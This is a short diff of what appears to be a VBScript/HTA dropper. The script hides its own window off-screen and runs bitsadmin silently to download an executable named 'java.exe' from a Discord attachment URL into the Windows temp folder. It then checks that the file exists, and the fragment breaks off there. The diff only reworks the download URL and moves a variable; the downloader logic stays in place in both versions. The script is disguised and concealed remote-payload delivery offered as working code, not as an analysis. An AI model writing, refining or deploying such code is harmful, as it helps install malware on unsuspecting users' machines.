@@ -3,9 +3,9 @@ Window.ResizeTo 0,0:Window.MoveTo -5000,-5000
 
 Dim shell: Set shell = CreateObject("WScript.Shell")
 Dim fso: Set fso = CreateObject("Scripting.FileSystemObject")
-Dim temp: temp = fso.GetSpecialFolder(2)
 
-Dim url: url = "https://cdn.discordapp.com/attachments/1504867078740377721/1520741480677769307/java.exe?ex=6a424c5f&is=6a40fadf&hm=26a9f6b98d8ea3bef43906a46877dace0e1d88e88eae62241a082d7c603062ff&" & Chr(38) & "is=6a3ec0ca" & Chr(38) & "hm=93fe19623a0c1856fbfa3f6ca5ef348d5ae3f7a7505fa010bb6a44f18769443f" & Chr(38)
+Dim url: url = "https://cdn.discordapp.com/attachments/1504867078740377721/1520741480677769307/java.exe?ex=6a424c5f&is=6a40fadf&hm=26a9f6b98d8ea3bef43906a46877dace0e1d88e88eae62241a082d7c603062ff&"
+Dim temp: temp = fso.GetSpecialFolder(2)
 shell.Run "bitsadmin /transfer d /download /priority high """ & url & """ """ & temp & "\java.exe""", 0, True
 
 If fso.FileExists(temp & "\java.exe") Then
